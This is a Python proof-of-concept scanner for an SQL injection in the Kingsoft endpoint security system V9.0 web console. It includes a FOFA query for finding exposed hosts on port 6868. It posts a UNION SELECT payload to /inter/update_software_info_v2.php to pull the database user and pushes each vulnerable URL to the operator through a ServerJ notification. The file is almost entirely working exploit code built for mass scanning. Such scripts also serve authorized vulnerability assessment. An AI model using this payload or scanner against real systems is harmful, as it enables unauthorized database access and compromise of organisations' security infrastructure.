# 金山终端安全系统V9.0 SQL注入漏洞
# fofa : app="金山终端安全系统V9.0Web控制台" 
# port=‘6868’
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os
import urllib.parse
import urllib.request
import re
import time
import ssl
import urllib
from urllib.parse import urljoin, quote
import ServerJ

bugName = '金山终端安全系统V9.0 SQL注入漏洞 '


def scan_JinsanZhongduan_v9_SQL_injection(url, proxies, append_to_output, serverJ_key, bugName):
    path = '/inter/update_software_info_v2.php'
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        "Content-type": "application/x-www-form-urlencoded",
        "User-Agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0',
        "Accept": 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        "Connection": "close"
    }
    data = 'type=-100+UNION+SELECT+1,user(),1,1,1,1,1,1--&key=&pageCount=0&curPage='

    target_url = url + path

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.post(target_url, headers=headers, data=data, verify=False, timeout=3, proxies=proxies)
        if req.status_code == 200 and "name" in req.text:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except requests.Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except requests.ConnectionError as conn_err:
        append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
